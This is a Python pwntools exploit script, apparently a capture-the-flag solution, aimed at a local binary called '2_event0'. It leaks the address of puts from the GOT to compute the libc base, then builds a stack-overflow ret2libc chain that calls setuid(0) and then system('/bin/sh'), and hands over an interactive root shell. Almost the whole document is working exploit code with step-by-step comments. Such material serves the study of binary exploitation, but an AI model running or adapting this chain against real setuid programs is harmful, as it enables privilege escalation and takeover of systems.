#!/usr/bin/python 

from pwn import * 

time = 0.2

# Starts processs
p = process("./2_event0") 

def main():
	# Skip till `name`
	skip_prompt()
	
	# Creates buf to fill name without overflowing it 
	# If canary is enabled 100 bytes is the max byte allowed before canary is
	# ovewritten and program crashes
	buf = "A" * 100 
	
	# Sends payload
	p.send(buf) 

	# Skip `option` prompt
	skip_prompt()

	# Select option {1} peek memory address
	select_peek_memory()

	# 0804a01c  00000507 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
	puts_GOT = 0x0804a01c
	
	# Determines addr of puts_GOT by peeking
	send_addr_hex(puts_GOT)
	peek_results = p.recvrepeat(time)

	# Extract results
	puts_addr = ""
	puts_addr = extract_hex_addr(peek_results)
	log.info("puts addr : 0x%x" %puts_addr)
	
	# Calculate libc base addr
	# objdump /lib/i386-linux-gnu/libc-2.23.so -d |grep "<_IO_puts@@GLIBC_2.0>"
	# 0005fca0 <_IO_puts@@GLIBC_2.0>:
	puts_offset = 0x0005fca0
	libc_base_addr = puts_addr - puts_offset
	log.info("libc base addr : 0x%x" %libc_base_addr)

	# Calculate system addr
	# objdump /lib/i386-linux-gnu/libc-2.23.so -d |grep system
	# 0003ada0 <__libc_system@@GLIBC_PRIVATE>:
	system_offset = 0x0003ada0
	system_addr = libc_base_addr + system_offset
	log.info("system addr : 0x%x" %system_addr)

	# Calculate /bin/sh addr
	# strings -a -tx /lib/i386-linux-gnu/libc-2.23.so |grep "/bin/sh"
	# 15ba0b /bin/sh
	bin_sh_offset = 0x15ba0b
	bin_sh_addr = libc_base_addr + bin_sh_offset
	log.info("/bin/sh addr : 0x%x" %bin_sh_addr)

	# Calculate setuid addr
	# objdump -d /lib/i386-linux-gnu/libc-2.23.so | grep setuid
	# 000b12e0 <setuid@@GLIBC_2.0>:
	setuid_offset = 0x000b12e0
	setuid_addr = libc_base_addr + setuid_offset 
	log.info("setuid addr : 0x%x" %setuid_addr)

	# pop -> ret
	# objdump -d /lib/i386-linux-gnu/libc-2.23.so | less
	# 177db:       5f                      pop    %edi
	# 177dc:       c3                      ret
	pop_ret_offset = 0x177db	
	pop_ret_addr = libc_base_addr + pop_ret_offset
	log.info("pop ret addr : 0x%x" %pop_ret_addr)
	
	# Select option to change name
	select_name()
	
	# gdb-peda$ pattern_offset 0x41384141
	# 1094205761 found at offset: 112
	buf = "A" * 112 
	buf += p32(setuid_addr)
	buf += p32(pop_ret_addr)
	buf += p32(0x0)
	buf += p32(system_addr)
	buf += "\x90" * 4
	buf += p32(bin_sh_addr)
	log.info("Payload crafted")

	# Send payload
	p.send(buf)
	log.info("Payload sent")

	# Pass interaction back to user
	p.interactive()

def skip_prompt():
	p.recvrepeat(time)

def extract_hex_addr(peek_results):
	for i in peek_results.split("\n"): # Splits result by newlines
		if "Contents:" in i: # If hex addr is found, perform string operations
			hex_addr = i[ i.find("0x") : len(i) ]			

	hex_addr = int(hex_addr, 16) # Converts hex string to hex
	return hex_addr

def send_addr_hex(addr):
	p.sendline(hex(addr))

def select_peek_memory():
	p.sendline("1")
	skip_prompt()

def select_name():
	p.sendline("2")
	skip_prompt()

if __name__ == "__main__": 
	main()

